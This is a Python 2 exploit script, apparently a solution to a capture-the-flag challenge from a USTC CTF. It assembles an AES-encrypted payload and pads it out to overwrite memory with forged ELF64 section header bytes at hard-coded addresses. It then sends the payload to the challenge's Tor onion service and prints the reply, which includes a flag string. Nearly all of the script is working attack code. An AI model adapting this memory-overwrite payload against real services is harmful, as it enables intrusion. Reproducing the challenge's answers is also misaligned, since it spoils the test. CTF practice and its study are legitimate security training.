#coding: utf-8

import socks, socket
from Crypto.Cipher import AES
def aes_encrypt(data, key, iv):
    cryptor = AES.new(key, AES.MODE_CBC, iv)
    return cryptor.encrypt(data)
def aes_decrypt(data, key, iv):
    cryptor = AES.new(key, AES.MODE_CBC, iv)
    return cryptor.decrypt(data)

aes_iv = 'some_rand_aes_iv'
aes_key = 'the_rand_aes_key'
valid_data = aes_iv+'\xAAroot\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xAA'
#405100: input 4051C0: aes_ctx 4051F8: ELF64 Section Header
payload = '736F6D655F72616E645F6165735F697694700B62136861C49907F0C9319FC3EBE83336532C56A1CC0887A9E7EAE8DCBA8CA2E468495C91F2618D9F83F6E1FDC1'.decode('hex')#aes_iv+aes_encrypt(valid_data+some_enc(valid_data), aes_key, aes_iv)
payload += (0x405238-0x405100-len(payload))*'\x00'
payload += '\x0b\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xa8\x02\x40\x00\x00\x00\x00\x00\xa8\x02\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
payload += '\x13\x00\x00\x00\x07\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xc4\x02\x40\x00\x00\x00\x00\x00\xc4\x02\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
payload += '\x21\x00\x00\x00\x07\x00\x00\x00' + aes_key
payload = payload.encode('hex').upper() + '\n'
# print payload
# exit()
server_addr = 'ustcctfbase7l74q.onion 2333'
welcome_msg = '''Welcome, cyber warriors, to the lost temple of FLXG!
For your own safety, you need to show me the blueprint of this trial. You won't pass the trial safely without it.
To be precise, we just need the CRC32 of the blueprint, in UPPERCASE format.\n'''
second_msg = '''Great! As a reward, take this magic spell with you.
Although it is not that powerful, I hope it will help you somehow.
flxg{But_the_Sun_Also_Rises}
Now, go ahead for the trial. CWK is waiting for you.

You have two choices:
0. Register
1. Start Trial
Now, show me your power.
flxg{'''
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9150)
tor_sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
tor_sock.connect(('ustcctfbase7l74q.onion', 2333))
tor_sock.send('3D6540C7\n')
tor_sock.send('1\n'+payload+'\n')
recved = ''
while(len(recved) <= len(welcome_msg+second_msg)):
    recved += tor_sock.recv(2048)
print recved
tor_sock.close()
